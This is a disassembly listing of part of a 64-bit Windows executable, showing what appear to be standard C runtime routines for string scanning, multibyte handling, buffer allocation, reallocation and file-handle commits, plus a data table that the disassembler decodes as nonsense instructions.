   140009c36:	74 34                	je     0x140009c6c
   140009c38:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   140009c3f:	00 
   140009c40:	0f be c0             	movsbl %al,%eax
   140009c43:	66 0f 6e c0          	movd   %eax,%xmm0
   140009c47:	66 0f 60 c0          	punpcklbw %xmm0,%xmm0
   140009c4b:	66 0f 60 c0          	punpcklbw %xmm0,%xmm0
   140009c4f:	66 0f 70 c0 00       	pshufd $0x0,%xmm0,%xmm0
   140009c54:	66 0f 74 c1          	pcmpeqb %xmm1,%xmm0
   140009c58:	66 0f d7 c0          	pmovmskb %xmm0,%eax
   140009c5c:	85 c0                	test   %eax,%eax
   140009c5e:	75 1a                	jne    0x140009c7a
   140009c60:	41 0f b6 40 01       	movzbl 0x1(%r8),%eax
   140009c65:	49 ff c0             	inc    %r8
   140009c68:	84 c0                	test   %al,%al
   140009c6a:	75 d4                	jne    0x140009c40
   140009c6c:	33 c0                	xor    %eax,%eax
   140009c6e:	48 8b 5c 24 10       	mov    0x10(%rsp),%rbx
   140009c73:	48 8b 74 24 18       	mov    0x18(%rsp),%rsi
   140009c78:	5f                   	pop    %rdi
   140009c79:	c3                   	ret
   140009c7a:	48 8b 5c 24 10       	mov    0x10(%rsp),%rbx
   140009c7f:	49 8b c0             	mov    %r8,%rax
   140009c82:	48 8b 74 24 18       	mov    0x18(%rsp),%rsi
   140009c87:	5f                   	pop    %rdi
   140009c88:	c3                   	ret
   140009c89:	0f 1f 00             	nopl   (%rax)
   140009c8c:	c2 99 00             	ret    $0x99
   140009c8f:	00 c9                	add    %cl,%cl
   140009c91:	99                   	cltd
   140009c92:	00 00                	add    %al,(%rax)
   140009c94:	d0 99 00 00 d7 99    	rcrb   $1,-0x66290000(%rcx)
   140009c9a:	00 00                	add    %al,(%rax)
   140009c9c:	de 99 00 00 e5 99    	ficomps -0x661b0000(%rcx)
   140009ca2:	00 00                	add    %al,(%rax)
   140009ca4:	ec                   	in     (%dx),%al
   140009ca5:	99                   	cltd
   140009ca6:	00 00                	add    %al,(%rax)
   140009ca8:	f3 99                	repz cltd
   140009caa:	00 00                	add    %al,(%rax)
   140009cac:	fa                   	cli
   140009cad:	99                   	cltd
   140009cae:	00 00                	add    %al,(%rax)
   140009cb0:	01 9a 00 00 08 9a    	add    %ebx,-0x65f80000(%rdx)
   140009cb6:	00 00                	add    %al,(%rax)
   140009cb8:	0f 9a 00             	setp   (%rax)
   140009cbb:	00 16                	add    %dl,(%rsi)
   140009cbd:	9a                   	(bad)
   140009cbe:	00 00                	add    %al,(%rax)
   140009cc0:	1d 9a 00 00 24       	sbb    $0x2400009a,%eax
   140009cc5:	9a                   	(bad)
   140009cc6:	00 00                	add    %al,(%rax)
   140009cc8:	7e 9a                	jle    0x140009c64
   140009cca:	00 00                	add    %al,(%rax)
   140009ccc:	8d 9a 00 00 9c 9a    	lea    -0x65640000(%rdx),%ebx
   140009cd2:	00 00                	add    %al,(%rax)
   140009cd4:	ab                   	stos   %eax,(%rdi)
   140009cd5:	9a                   	(bad)
   140009cd6:	00 00                	add    %al,(%rax)
   140009cd8:	ba 9a 00 00 c6       	mov    $0xc600009a,%edx
   140009cdd:	9a                   	(bad)
   140009cde:	00 00                	add    %al,(%rax)
   140009ce0:	d2 9a 00 00 de 9a    	rcrb   %cl,-0x65220000(%rdx)
   140009ce6:	00 00                	add    %al,(%rax)
   140009ce8:	ea                   	(bad)
   140009ce9:	9a                   	(bad)
   140009cea:	00 00                	add    %al,(%rax)
   140009cec:	f6 9a 00 00 02 9b    	negb   -0x64fe0000(%rdx)
   140009cf2:	00 00                	add    %al,(%rax)
   140009cf4:	0e                   	(bad)
   140009cf5:	9b                   	fwait
   140009cf6:	00 00                	add    %al,(%rax)
   140009cf8:	1a 9b 00 00 26 9b    	sbb    -0x64da0000(%rbx),%bl
   140009cfe:	00 00                	add    %al,(%rax)
   140009d00:	32 9b 00 00 3e 9b    	xor    -0x64c20000(%rbx),%bl
   140009d06:	00 00                	add    %al,(%rax)
   140009d08:	bc 9b 00 00 c3       	mov    $0xc300009b,%esp
   140009d0d:	9b                   	fwait
   140009d0e:	00 00                	add    %al,(%rax)
   140009d10:	ca 9b 00             	lret   $0x9b
   140009d13:	00 d1                	add    %dl,%cl
   140009d15:	9b                   	fwait
   140009d16:	00 00                	add    %al,(%rax)
   140009d18:	d8 9b 00 00 df 9b    	fcomps -0x64210000(%rbx)
   140009d1e:	00 00                	add    %al,(%rax)
   140009d20:	e6 9b                	out    %al,$0x9b
   140009d22:	00 00                	add    %al,(%rax)
   140009d24:	ed                   	in     (%dx),%eax
   140009d25:	9b                   	fwait
   140009d26:	00 00                	add    %al,(%rax)
   140009d28:	f4                   	hlt
   140009d29:	9b                   	fwait
   140009d2a:	00 00                	add    %al,(%rax)
   140009d2c:	fb                   	sti
   140009d2d:	9b                   	fwait
   140009d2e:	00 00                	add    %al,(%rax)
   140009d30:	02 9c 00 00 09 9c 00 	add    0x9c0900(%rax,%rax,1),%bl
   140009d37:	00 10                	add    %dl,(%rax)
   140009d39:	9c                   	pushf
   140009d3a:	00 00                	add    %al,(%rax)
   140009d3c:	17                   	(bad)
   140009d3d:	9c                   	pushf
   140009d3e:	00 00                	add    %al,(%rax)
   140009d40:	1e                   	(bad)
   140009d41:	9c                   	pushf
   140009d42:	00 00                	add    %al,(%rax)
   140009d44:	25 9c 00 00 45       	and    $0x4500009c,%eax
   140009d49:	33 c0                	xor    %eax,%eax
   140009d4b:	e9 00 00 00 00       	jmp    0x140009d50
   140009d50:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140009d55:	57                   	push   %rdi
   140009d56:	48 83 ec 40          	sub    $0x40,%rsp
   140009d5a:	48 8b da             	mov    %rdx,%rbx
   140009d5d:	48 8b f9             	mov    %rcx,%rdi
   140009d60:	48 85 c9             	test   %rcx,%rcx
   140009d63:	75 14                	jne    0x140009d79
   140009d65:	e8 26 bc ff ff       	call   0x140005990
   140009d6a:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   140009d70:	e8 fb ba ff ff       	call   0x140005870
   140009d75:	33 c0                	xor    %eax,%eax
   140009d77:	eb 60                	jmp    0x140009dd9
   140009d79:	48 85 db             	test   %rbx,%rbx
   140009d7c:	74 e7                	je     0x140009d65
   140009d7e:	48 3b fb             	cmp    %rbx,%rdi
   140009d81:	73 f2                	jae    0x140009d75
   140009d83:	49 8b d0             	mov    %r8,%rdx
   140009d86:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140009d8b:	e8 b0 9c ff ff       	call   0x140003a40
   140009d90:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
   140009d95:	48 8d 53 ff          	lea    -0x1(%rbx),%rdx
   140009d99:	83 79 08 00          	cmpl   $0x0,0x8(%rcx)
   140009d9d:	74 24                	je     0x140009dc3
   140009d9f:	48 ff ca             	dec    %rdx
   140009da2:	48 3b fa             	cmp    %rdx,%rdi
   140009da5:	77 0a                	ja     0x140009db1
   140009da7:	0f b6 02             	movzbl (%rdx),%eax
   140009daa:	f6 44 08 19 04       	testb  $0x4,0x19(%rax,%rcx,1)
   140009daf:	75 ee                	jne    0x140009d9f
   140009db1:	48 8b cb             	mov    %rbx,%rcx
   140009db4:	48 2b ca             	sub    %rdx,%rcx
   140009db7:	48 8b d3             	mov    %rbx,%rdx
   140009dba:	83 e1 01             	and    $0x1,%ecx
   140009dbd:	48 2b d1             	sub    %rcx,%rdx
   140009dc0:	48 ff ca             	dec    %rdx
   140009dc3:	80 7c 24 38 00       	cmpb   $0x0,0x38(%rsp)
   140009dc8:	74 0c                	je     0x140009dd6
   140009dca:	48 8b 4c 24 20       	mov    0x20(%rsp),%rcx
   140009dcf:	83 a1 a8 03 00 00 fd 	andl   $0xfffffffd,0x3a8(%rcx)
   140009dd6:	48 8b c2             	mov    %rdx,%rax
   140009dd9:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
   140009dde:	48 83 c4 40          	add    $0x40,%rsp
   140009de2:	5f                   	pop    %rdi
   140009de3:	c3                   	ret
   140009de4:	40 55                	rex push %rbp
   140009de6:	41 54                	push   %r12
   140009de8:	41 55                	push   %r13
   140009dea:	41 56                	push   %r14
   140009dec:	41 57                	push   %r15
   140009dee:	48 83 ec 60          	sub    $0x60,%rsp
   140009df2:	48 8d 6c 24 50       	lea    0x50(%rsp),%rbp
   140009df7:	48 89 5d 40          	mov    %rbx,0x40(%rbp)
   140009dfb:	48 89 75 48          	mov    %rsi,0x48(%rbp)
   140009dff:	48 89 7d 50          	mov    %rdi,0x50(%rbp)
   140009e03:	48 8b 05 f6 d1 00 00 	mov    0xd1f6(%rip),%rax        # 0x140017000
   140009e0a:	48 33 c5             	xor    %rbp,%rax
   140009e0d:	48 89 45 08          	mov    %rax,0x8(%rbp)
   140009e11:	48 63 5d 60          	movslq 0x60(%rbp),%rbx
   140009e15:	4d 8b f9             	mov    %r9,%r15
   140009e18:	48 89 55 00          	mov    %rdx,0x0(%rbp)
   140009e1c:	45 8b e8             	mov    %r8d,%r13d
   140009e1f:	48 8b f9             	mov    %rcx,%rdi
   140009e22:	85 db                	test   %ebx,%ebx
   140009e24:	7e 14                	jle    0x140009e3a
   140009e26:	48 8b d3             	mov    %rbx,%rdx
   140009e29:	49 8b c9             	mov    %r9,%rcx
   140009e2c:	e8 f3 14 00 00       	call   0x14000b324
   140009e31:	3b c3                	cmp    %ebx,%eax
   140009e33:	8d 58 01             	lea    0x1(%rax),%ebx
   140009e36:	7c 02                	jl     0x140009e3a
   140009e38:	8b d8                	mov    %eax,%ebx
   140009e3a:	44 8b 75 78          	mov    0x78(%rbp),%r14d
   140009e3e:	45 85 f6             	test   %r14d,%r14d
   140009e41:	75 07                	jne    0x140009e4a
   140009e43:	48 8b 07             	mov    (%rdi),%rax
   140009e46:	44 8b 70 0c          	mov    0xc(%rax),%r14d
   140009e4a:	f7 9d 80 00 00 00    	negl   0x80(%rbp)
   140009e50:	44 8b cb             	mov    %ebx,%r9d
   140009e53:	4d 8b c7             	mov    %r15,%r8
   140009e56:	41 8b ce             	mov    %r14d,%ecx
   140009e59:	1b d2                	sbb    %edx,%edx
   140009e5b:	83 64 24 28 00       	andl   $0x0,0x28(%rsp)
   140009e60:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   140009e66:	83 e2 08             	and    $0x8,%edx
   140009e69:	ff c2                	inc    %edx
   140009e6b:	e8 4c da ff ff       	call   0x1400078bc
   140009e70:	4c 63 e0             	movslq %eax,%r12
   140009e73:	85 c0                	test   %eax,%eax
   140009e75:	0f 84 36 02 00 00    	je     0x14000a0b1
   140009e7b:	49 8b c4             	mov    %r12,%rax
   140009e7e:	49 b8 f0 ff ff ff ff 	movabs $0xffffffffffffff0,%r8
   140009e85:	ff ff 0f 
   140009e88:	48 03 c0             	add    %rax,%rax
   140009e8b:	48 8d 48 10          	lea    0x10(%rax),%rcx
   140009e8f:	48 3b c1             	cmp    %rcx,%rax
   140009e92:	48 1b d2             	sbb    %rdx,%rdx
   140009e95:	48 23 d1             	and    %rcx,%rdx
   140009e98:	74 53                	je     0x140009eed
   140009e9a:	48 81 fa 00 04 00 00 	cmp    $0x400,%rdx
   140009ea1:	77 2e                	ja     0x140009ed1
   140009ea3:	48 8d 42 0f          	lea    0xf(%rdx),%rax
   140009ea7:	48 3b c2             	cmp    %rdx,%rax
   140009eaa:	77 03                	ja     0x140009eaf
   140009eac:	49 8b c0             	mov    %r8,%rax
   140009eaf:	48 83 e0 f0          	and    $0xfffffffffffffff0,%rax
   140009eb3:	e8 78 2a 00 00       	call   0x14000c930
   140009eb8:	48 2b e0             	sub    %rax,%rsp
   140009ebb:	48 8d 74 24 50       	lea    0x50(%rsp),%rsi
   140009ec0:	48 85 f6             	test   %rsi,%rsi
   140009ec3:	0f 84 ce 01 00 00    	je     0x14000a097
   140009ec9:	c7 06 cc cc 00 00    	movl   $0xcccc,(%rsi)
   140009ecf:	eb 16                	jmp    0x140009ee7
   140009ed1:	48 8b ca             	mov    %rdx,%rcx
   140009ed4:	e8 bf c1 ff ff       	call   0x140006098
   140009ed9:	48 8b f0             	mov    %rax,%rsi
   140009edc:	48 85 c0             	test   %rax,%rax
   140009edf:	74 0e                	je     0x140009eef
   140009ee1:	c7 00 dd dd 00 00    	movl   $0xdddd,(%rax)
   140009ee7:	48 83 c6 10          	add    $0x10,%rsi
   140009eeb:	eb 02                	jmp    0x140009eef
   140009eed:	33 f6                	xor    %esi,%esi
   140009eef:	48 85 f6             	test   %rsi,%rsi
   140009ef2:	0f 84 9f 01 00 00    	je     0x14000a097
   140009ef8:	44 89 64 24 28       	mov    %r12d,0x28(%rsp)
   140009efd:	44 8b cb             	mov    %ebx,%r9d
   140009f00:	4d 8b c7             	mov    %r15,%r8
   140009f03:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   140009f08:	ba 01 00 00 00       	mov    $0x1,%edx
   140009f0d:	41 8b ce             	mov    %r14d,%ecx
   140009f10:	e8 a7 d9 ff ff       	call   0x1400078bc
   140009f15:	85 c0                	test   %eax,%eax
   140009f17:	0f 84 7a 01 00 00    	je     0x14000a097
   140009f1d:	48 83 64 24 40 00    	andq   $0x0,0x40(%rsp)
   140009f23:	45 8b cc             	mov    %r12d,%r9d
   140009f26:	48 83 64 24 38 00    	andq   $0x0,0x38(%rsp)
   140009f2c:	4c 8b c6             	mov    %rsi,%r8
   140009f2f:	48 83 64 24 30 00    	andq   $0x0,0x30(%rsp)
   140009f35:	41 8b d5             	mov    %r13d,%edx
   140009f38:	4c 8b 7d 00          	mov    0x0(%rbp),%r15
   140009f3c:	83 64 24 28 00       	andl   $0x0,0x28(%rsp)
   140009f41:	49 8b cf             	mov    %r15,%rcx
   140009f44:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   140009f4a:	e8 55 be ff ff       	call   0x140005da4
   140009f4f:	48 63 f8             	movslq %eax,%rdi
   140009f52:	85 c0                	test   %eax,%eax
   140009f54:	0f 84 3d 01 00 00    	je     0x14000a097
   140009f5a:	ba 00 04 00 00       	mov    $0x400,%edx
   140009f5f:	44 85 ea             	test   %r13d,%edx
   140009f62:	74 52                	je     0x140009fb6
   140009f64:	8b 45 70             	mov    0x70(%rbp),%eax
   140009f67:	85 c0                	test   %eax,%eax
   140009f69:	0f 84 2a 01 00 00    	je     0x14000a099
   140009f6f:	3b f8                	cmp    %eax,%edi
   140009f71:	0f 8f 20 01 00 00    	jg     0x14000a097
   140009f77:	48 83 64 24 40 00    	andq   $0x0,0x40(%rsp)
   140009f7d:	45 8b cc             	mov    %r12d,%r9d
   140009f80:	48 83 64 24 38 00    	andq   $0x0,0x38(%rsp)
   140009f86:	4c 8b c6             	mov    %rsi,%r8
   140009f89:	48 83 64 24 30 00    	andq   $0x0,0x30(%rsp)
   140009f8f:	41 8b d5             	mov    %r13d,%edx
   140009f92:	89 44 24 28          	mov    %eax,0x28(%rsp)
   140009f96:	49 8b cf             	mov    %r15,%rcx
   140009f99:	48 8b 45 68          	mov    0x68(%rbp),%rax
   140009f9d:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140009fa2:	e8 fd bd ff ff       	call   0x140005da4
   140009fa7:	8b f8                	mov    %eax,%edi
   140009fa9:	85 c0                	test   %eax,%eax
   140009fab:	0f 85 e8 00 00 00    	jne    0x14000a099
   140009fb1:	e9 e1 00 00 00       	jmp    0x14000a097
   140009fb6:	48 8b cf             	mov    %rdi,%rcx
   140009fb9:	48 03 c9             	add    %rcx,%rcx
   140009fbc:	48 8d 41 10          	lea    0x10(%rcx),%rax
   140009fc0:	48 3b c8             	cmp    %rax,%rcx
   140009fc3:	48 1b c9             	sbb    %rcx,%rcx
   140009fc6:	48 23 c8             	and    %rax,%rcx
   140009fc9:	74 53                	je     0x14000a01e
   140009fcb:	48 3b ca             	cmp    %rdx,%rcx
   140009fce:	77 35                	ja     0x14000a005
   140009fd0:	48 8d 41 0f          	lea    0xf(%rcx),%rax
   140009fd4:	48 3b c1             	cmp    %rcx,%rax
   140009fd7:	77 0a                	ja     0x140009fe3
   140009fd9:	48 b8 f0 ff ff ff ff 	movabs $0xffffffffffffff0,%rax
   140009fe0:	ff ff 0f 
   140009fe3:	48 83 e0 f0          	and    $0xfffffffffffffff0,%rax
   140009fe7:	e8 44 29 00 00       	call   0x14000c930
   140009fec:	48 2b e0             	sub    %rax,%rsp
   140009fef:	48 8d 5c 24 50       	lea    0x50(%rsp),%rbx
   140009ff4:	48 85 db             	test   %rbx,%rbx
   140009ff7:	0f 84 9a 00 00 00    	je     0x14000a097
   140009ffd:	c7 03 cc cc 00 00    	movl   $0xcccc,(%rbx)
   14000a003:	eb 13                	jmp    0x14000a018
   14000a005:	e8 8e c0 ff ff       	call   0x140006098
   14000a00a:	48 8b d8             	mov    %rax,%rbx
   14000a00d:	48 85 c0             	test   %rax,%rax
   14000a010:	74 0e                	je     0x14000a020
   14000a012:	c7 00 dd dd 00 00    	movl   $0xdddd,(%rax)
   14000a018:	48 83 c3 10          	add    $0x10,%rbx
   14000a01c:	eb 02                	jmp    0x14000a020
   14000a01e:	33 db                	xor    %ebx,%ebx
   14000a020:	48 85 db             	test   %rbx,%rbx
   14000a023:	74 72                	je     0x14000a097
   14000a025:	48 83 64 24 40 00    	andq   $0x0,0x40(%rsp)
   14000a02b:	45 8b cc             	mov    %r12d,%r9d
   14000a02e:	48 83 64 24 38 00    	andq   $0x0,0x38(%rsp)
   14000a034:	4c 8b c6             	mov    %rsi,%r8
   14000a037:	48 83 64 24 30 00    	andq   $0x0,0x30(%rsp)
   14000a03d:	41 8b d5             	mov    %r13d,%edx
   14000a040:	89 7c 24 28          	mov    %edi,0x28(%rsp)
   14000a044:	49 8b cf             	mov    %r15,%rcx
   14000a047:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   14000a04c:	e8 53 bd ff ff       	call   0x140005da4
   14000a051:	85 c0                	test   %eax,%eax
   14000a053:	74 31                	je     0x14000a086
   14000a055:	48 83 64 24 38 00    	andq   $0x0,0x38(%rsp)
   14000a05b:	33 d2                	xor    %edx,%edx
   14000a05d:	48 21 54 24 30       	and    %rdx,0x30(%rsp)
   14000a062:	44 8b cf             	mov    %edi,%r9d
   14000a065:	8b 45 70             	mov    0x70(%rbp),%eax
   14000a068:	4c 8b c3             	mov    %rbx,%r8
   14000a06b:	41 8b ce             	mov    %r14d,%ecx
   14000a06e:	85 c0                	test   %eax,%eax
   14000a070:	75 65                	jne    0x14000a0d7
   14000a072:	21 54 24 28          	and    %edx,0x28(%rsp)
   14000a076:	48 21 54 24 20       	and    %rdx,0x20(%rsp)
   14000a07b:	e8 98 d8 ff ff       	call   0x140007918
   14000a080:	8b f8                	mov    %eax,%edi
   14000a082:	85 c0                	test   %eax,%eax
   14000a084:	75 60                	jne    0x14000a0e6
   14000a086:	48 8d 4b f0          	lea    -0x10(%rbx),%rcx
   14000a08a:	81 39 dd dd 00 00    	cmpl   $0xdddd,(%rcx)
   14000a090:	75 05                	jne    0x14000a097
   14000a092:	e8 d9 c0 ff ff       	call   0x140006170
   14000a097:	33 ff                	xor    %edi,%edi
   14000a099:	48 85 f6             	test   %rsi,%rsi
   14000a09c:	74 11                	je     0x14000a0af
   14000a09e:	48 8d 4e f0          	lea    -0x10(%rsi),%rcx
   14000a0a2:	81 39 dd dd 00 00    	cmpl   $0xdddd,(%rcx)
   14000a0a8:	75 05                	jne    0x14000a0af
   14000a0aa:	e8 c1 c0 ff ff       	call   0x140006170
   14000a0af:	8b c7                	mov    %edi,%eax
   14000a0b1:	48 8b 4d 08          	mov    0x8(%rbp),%rcx
   14000a0b5:	48 33 cd             	xor    %rbp,%rcx
   14000a0b8:	e8 c3 74 ff ff       	call   0x140001580
   14000a0bd:	48 8b 5d 40          	mov    0x40(%rbp),%rbx
   14000a0c1:	48 8b 75 48          	mov    0x48(%rbp),%rsi
   14000a0c5:	48 8b 7d 50          	mov    0x50(%rbp),%rdi
   14000a0c9:	48 8d 65 10          	lea    0x10(%rbp),%rsp
   14000a0cd:	41 5f                	pop    %r15
   14000a0cf:	41 5e                	pop    %r14
   14000a0d1:	41 5d                	pop    %r13
   14000a0d3:	41 5c                	pop    %r12
   14000a0d5:	5d                   	pop    %rbp
   14000a0d6:	c3                   	ret
   14000a0d7:	89 44 24 28          	mov    %eax,0x28(%rsp)
   14000a0db:	48 8b 45 68          	mov    0x68(%rbp),%rax
   14000a0df:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   14000a0e4:	eb 95                	jmp    0x14000a07b
   14000a0e6:	48 8d 4b f0          	lea    -0x10(%rbx),%rcx
   14000a0ea:	81 39 dd dd 00 00    	cmpl   $0xdddd,(%rcx)
   14000a0f0:	75 a7                	jne    0x14000a099
   14000a0f2:	e8 79 c0 ff ff       	call   0x140006170
   14000a0f7:	eb a0                	jmp    0x14000a099
   14000a0f9:	cc                   	int3
   14000a0fa:	cc                   	int3
   14000a0fb:	cc                   	int3
   14000a0fc:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000a101:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   14000a106:	57                   	push   %rdi
   14000a107:	48 83 ec 70          	sub    $0x70,%rsp
   14000a10b:	48 8b f2             	mov    %rdx,%rsi
   14000a10e:	49 8b d9             	mov    %r9,%rbx
   14000a111:	48 8b d1             	mov    %rcx,%rdx
   14000a114:	41 8b f8             	mov    %r8d,%edi
   14000a117:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   14000a11c:	e8 1f 99 ff ff       	call   0x140003a40
   14000a121:	8b 84 24 c0 00 00 00 	mov    0xc0(%rsp),%eax
   14000a128:	48 8d 4c 24 58       	lea    0x58(%rsp),%rcx
   14000a12d:	89 44 24 40          	mov    %eax,0x40(%rsp)
   14000a131:	4c 8b cb             	mov    %rbx,%r9
   14000a134:	8b 84 24 b8 00 00 00 	mov    0xb8(%rsp),%eax
   14000a13b:	44 8b c7             	mov    %edi,%r8d
   14000a13e:	89 44 24 38          	mov    %eax,0x38(%rsp)
   14000a142:	48 8b d6             	mov    %rsi,%rdx
   14000a145:	8b 84 24 b0 00 00 00 	mov    0xb0(%rsp),%eax
   14000a14c:	89 44 24 30          	mov    %eax,0x30(%rsp)
   14000a150:	48 8b 84 24 a8 00 00 	mov    0xa8(%rsp),%rax
   14000a157:	00 
   14000a158:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   14000a15d:	8b 84 24 a0 00 00 00 	mov    0xa0(%rsp),%eax
   14000a164:	89 44 24 20          	mov    %eax,0x20(%rsp)
   14000a168:	e8 77 fc ff ff       	call   0x140009de4
   14000a16d:	80 7c 24 68 00       	cmpb   $0x0,0x68(%rsp)
   14000a172:	74 0c                	je     0x14000a180
   14000a174:	48 8b 4c 24 50       	mov    0x50(%rsp),%rcx
   14000a179:	83 a1 a8 03 00 00 fd 	andl   $0xfffffffd,0x3a8(%rcx)
   14000a180:	4c 8d 5c 24 70       	lea    0x70(%rsp),%r11
   14000a185:	49 8b 5b 10          	mov    0x10(%r11),%rbx
   14000a189:	49 8b 73 18          	mov    0x18(%r11),%rsi
   14000a18d:	49 8b e3             	mov    %r11,%rsp
   14000a190:	5f                   	pop    %rdi
   14000a191:	c3                   	ret
   14000a192:	cc                   	int3
   14000a193:	cc                   	int3
   14000a194:	48 83 ec 28          	sub    $0x28,%rsp
   14000a198:	e8 33 d3 ff ff       	call   0x1400074d0
   14000a19d:	33 c9                	xor    %ecx,%ecx
   14000a19f:	84 c0                	test   %al,%al
   14000a1a1:	0f 94 c1             	sete   %cl
   14000a1a4:	8b c1                	mov    %ecx,%eax
   14000a1a6:	48 83 c4 28          	add    $0x28,%rsp
   14000a1aa:	c3                   	ret
   14000a1ab:	cc                   	int3
   14000a1ac:	48 83 ec 28          	sub    $0x28,%rsp
   14000a1b0:	48 85 c9             	test   %rcx,%rcx
   14000a1b3:	75 19                	jne    0x14000a1ce
   14000a1b5:	e8 d6 b7 ff ff       	call   0x140005990
   14000a1ba:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   14000a1c0:	e8 ab b6 ff ff       	call   0x140005870
   14000a1c5:	48 83 c8 ff          	or     $0xffffffffffffffff,%rax
   14000a1c9:	48 83 c4 28          	add    $0x28,%rsp
   14000a1cd:	c3                   	ret
   14000a1ce:	4c 8b c1             	mov    %rcx,%r8
   14000a1d1:	33 d2                	xor    %edx,%edx
   14000a1d3:	48 8b 0d 06 ea 00 00 	mov    0xea06(%rip),%rcx        # 0x140018be0
   14000a1da:	48 83 c4 28          	add    $0x28,%rsp
   14000a1de:	48 ff 25 e3 2e 00 00 	rex.W jmp *0x2ee3(%rip)        # 0x14000d0c8
   14000a1e5:	cc                   	int3
   14000a1e6:	cc                   	int3
   14000a1e7:	cc                   	int3
   14000a1e8:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000a1ed:	57                   	push   %rdi
   14000a1ee:	48 83 ec 20          	sub    $0x20,%rsp
   14000a1f2:	48 8b da             	mov    %rdx,%rbx
   14000a1f5:	48 8b f9             	mov    %rcx,%rdi
   14000a1f8:	48 85 c9             	test   %rcx,%rcx
   14000a1fb:	75 0a                	jne    0x14000a207
   14000a1fd:	48 8b ca             	mov    %rdx,%rcx
   14000a200:	e8 93 be ff ff       	call   0x140006098
   14000a205:	eb 1f                	jmp    0x14000a226
   14000a207:	48 85 db             	test   %rbx,%rbx
   14000a20a:	75 07                	jne    0x14000a213
   14000a20c:	e8 5f bf ff ff       	call   0x140006170
   14000a211:	eb 11                	jmp    0x14000a224
   14000a213:	48 83 fb e0          	cmp    $0xffffffffffffffe0,%rbx
   14000a217:	76 2d                	jbe    0x14000a246
   14000a219:	e8 72 b7 ff ff       	call   0x140005990
   14000a21e:	c7 00 0c 00 00 00    	movl   $0xc,(%rax)
   14000a224:	33 c0                	xor    %eax,%eax
   14000a226:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000a22b:	48 83 c4 20          	add    $0x20,%rsp
   14000a22f:	5f                   	pop    %rdi
   14000a230:	c3                   	ret
   14000a231:	e8 a6 a6 ff ff       	call   0x1400048dc
   14000a236:	85 c0                	test   %eax,%eax
   14000a238:	74 df                	je     0x14000a219
   14000a23a:	48 8b cb             	mov    %rbx,%rcx
   14000a23d:	e8 ee 98 ff ff       	call   0x140003b30
   14000a242:	85 c0                	test   %eax,%eax
   14000a244:	74 d3                	je     0x14000a219
   14000a246:	48 8b 0d 93 e9 00 00 	mov    0xe993(%rip),%rcx        # 0x140018be0
   14000a24d:	4c 8b cb             	mov    %rbx,%r9
   14000a250:	4c 8b c7             	mov    %rdi,%r8
   14000a253:	33 d2                	xor    %edx,%edx
   14000a255:	ff 15 65 2e 00 00    	call   *0x2e65(%rip)        # 0x14000d0c0
   14000a25b:	48 85 c0             	test   %rax,%rax
   14000a25e:	74 d1                	je     0x14000a231
   14000a260:	eb c4                	jmp    0x14000a226
   14000a262:	cc                   	int3
   14000a263:	cc                   	int3
   14000a264:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000a269:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   14000a26e:	57                   	push   %rdi
   14000a26f:	48 83 ec 20          	sub    $0x20,%rsp
   14000a273:	49 8b f9             	mov    %r9,%rdi
   14000a276:	49 8b d8             	mov    %r8,%rbx
   14000a279:	8b 0a                	mov    (%rdx),%ecx
   14000a27b:	e8 28 da ff ff       	call   0x140007ca8
   14000a280:	90                   	nop
   14000a281:	48 8b 03             	mov    (%rbx),%rax
   14000a284:	48 63 08             	movslq (%rax),%rcx
   14000a287:	48 8b d1             	mov    %rcx,%rdx
   14000a28a:	48 8b c1             	mov    %rcx,%rax
   14000a28d:	48 c1 f8 06          	sar    $0x6,%rax
   14000a291:	4c 8d 05 38 e5 00 00 	lea    0xe538(%rip),%r8        # 0x1400187d0
   14000a298:	83 e2 3f             	and    $0x3f,%edx
   14000a29b:	48 8d 14 d2          	lea    (%rdx,%rdx,8),%rdx
   14000a29f:	49 8b 04 c0          	mov    (%r8,%rax,8),%rax
   14000a2a3:	f6 44 d0 38 01       	testb  $0x1,0x38(%rax,%rdx,8)
   14000a2a8:	74 24                	je     0x14000a2ce
   14000a2aa:	e8 05 db ff ff       	call   0x140007db4
   14000a2af:	48 8b c8             	mov    %rax,%rcx
   14000a2b2:	ff 15 00 2e 00 00    	call   *0x2e00(%rip)        # 0x14000d0b8
   14000a2b8:	33 db                	xor    %ebx,%ebx
   14000a2ba:	85 c0                	test   %eax,%eax
   14000a2bc:	75 1e                	jne    0x14000a2dc
   14000a2be:	e8 ad b6 ff ff       	call   0x140005970
   14000a2c3:	48 8b d8             	mov    %rax,%rbx
   14000a2c6:	ff 15 4c 2d 00 00    	call   *0x2d4c(%rip)        # 0x14000d018
   14000a2cc:	89 03                	mov    %eax,(%rbx)
   14000a2ce:	e8 bd b6 ff ff       	call   0x140005990
   14000a2d3:	c7 00 09 00 00 00    	movl   $0x9,(%rax)
   14000a2d9:	83 cb ff             	or     $0xffffffff,%ebx
   14000a2dc:	8b 0f                	mov    (%rdi),%ecx
   14000a2de:	e8 ed d9 ff ff       	call   0x140007cd0
   14000a2e3:	8b c3                	mov    %ebx,%eax
   14000a2e5:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000a2ea:	48 83 c4 20          	add    $0x20,%rsp
   14000a2ee:	5f                   	pop    %rdi
   14000a2ef:	c3                   	ret
   14000a2f0:	89 4c 24 08          	mov    %ecx,0x8(%rsp)
   14000a2f4:	48 83 ec 38          	sub    $0x38,%rsp
   14000a2f8:	48 63 d1             	movslq %ecx,%rdx
